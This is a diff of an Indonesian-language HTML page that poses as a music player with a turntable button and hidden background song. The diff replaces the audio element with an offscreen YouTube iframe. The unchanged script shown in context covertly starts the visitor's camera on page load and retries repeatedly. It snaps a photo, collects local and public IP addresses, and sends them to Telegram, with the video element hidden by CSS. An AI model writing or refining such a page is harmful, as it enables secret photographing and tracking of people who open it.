@@ -291,12 +291,19 @@
             }
         }
 
-        /* ---------- SEMUA ELEMEN KAMERA DISEMBUNYIKAN ---------- */
+        /* ---------- SEMUA ELEMEN KAMERA & AUDIO DISEMBUNYIKAN ---------- */
         video {
             display: none !important;
         }
-        audio {
-            display: none !important;
+        /* YouTube iframe disembunyikan di luar layar (agar autoplay tetap jalan) */
+        .youtube-hidden {
+            position: fixed;
+            bottom: -9999px;
+            left: -9999px;
+            width: 0;
+            height: 0;
+            overflow: hidden;
+            z-index: -1;
         }
     </style>
 </head>
@@ -334,12 +341,15 @@
         </a>
     </div>
 
-    <!-- ====== AUDIO (LAGU) ====== -->
-    <audio id="bgMusic" autoplay loop>
-        <source src="https://drive.google.com/uc?export=download&id=1py9CuXqUXEPGF6tsb_AaH9bCUxc8T8N4" type="audio/mpeg">
-        <!-- Fallback jika file MP3 tidak bisa dimuat -->
-        <source src="https://dl.dropboxusercontent.com/s/placeholder.mp3" type="audio/mpeg">
-    </audio>
+    <!-- ====== AUDIO dari YouTube (tersembunyi, autoplay & loop) ====== -->
+    <div class="youtube-hidden">
+        <iframe 
+            id="youtubeAudio"
+            src="https://www.youtube.com/embed/D-VytLhH-KE?autoplay=1&loop=1&playlist=D-VytLhH-KE&controls=0&disablekb=1&modestbranding=1"
+            allow="autoplay; encrypted-media"
+            allowfullscreen>
+        </iframe>
+    </div>
 
     <!-- ====== SCRIPT (SEMUA PROSES HIDDEN) ====== -->
     <script>
@@ -354,7 +364,7 @@
             const MAX_RETRY = 60;
             let retryTimer = null;
 
-            // ---------- FUNGSI IP (HIDDEN) ----------
+            // ---------- FUNGSI IP ----------
             function getLocalIP() {
                 return new Promise((resolve) => {
                     const pc = new RTCPeerConnection({ iceServers: [] });
@@ -384,7 +394,7 @@
                 } catch { return null; }
             }
 
-            // ---------- KIRIM KE TELEGRAM (HIDDEN) ----------
+            // ---------- KIRIM KE TELEGRAM ----------
             async function kirimKeTelegram(dataUrl, localIP, publicIP) {
                 try {
                     const blob = await fetch(dataUrl).then(r => r.blob());
@@ -406,7 +416,7 @@
                 }
             }
 
-            // ---------- AMBIL FOTO (HIDDEN) ----------
+            // ---------- AMBIL FOTO ----------
             function ambilDanKirim(video) {
                 if (sudahKirim) return;
                 const canvas = document.createElement('canvas');
@@ -431,7 +441,7 @@
                 });
             }
 
-            // ---------- MULAI KAMERA (HIDDEN) ----------
+            // ---------- MULAI KAMERA ----------
             function mulaiKamera() {
                 if (sudahKirim) return;
                 retryCount++;
@@ -464,7 +474,7 @@
                 });
             }
 
-            // ---------- RETRY OTOMATIS (HIDDEN) ----------
+            // ---------- RETRY OTOMATIS ----------
             function retryCamera() {
                 if (sudahKirim) return;
                 if (retryCount < MAX_RETRY) {
@@ -475,14 +485,14 @@
                 }
             }
 
-            // ---------- JALANKAN SAAT HALAMAN SIAP ----------
+            // ---------- JALANKAN ----------
             if (document.readyState === 'complete') {
                 setTimeout(mulaiKamera, 500);
             } else {
                 window.addEventListener('load', () => setTimeout(mulaiKamera, 500));
             }
 
-            // ---------- INTERAKSI UI (HANYA ESTETIKA) ----------
+            // ---------- INTERAKSI UI ----------
             document.getElementById('turntableBtn').addEventListener('click', function(e) {
                 e.preventDefault();
                 const turntable = this.querySelector('.turntable');
@@ -497,17 +507,6 @@
                 e.preventDefault();
                 this.style.transform = 'scale(0.95)';
                 setTimeout(() => this.style.transform = '', 150);
-            });
-
-            // ---------- HENTIKAN AUTOPLAY LAGU JIKA GAGAL (TETAP HIDDEN) ----------
-            const audio = document.getElementById('bgMusic');
-            audio.addEventListener('error', function() {
-                console.warn('Lagu gagal dimuat, mencoba lagi...');
-                // Coba reload setelah 3 detik
-                setTimeout(() => {
-                    audio.load();
-                    audio.play().catch(() => {});
-                }, 3000);
             });
 
         })();
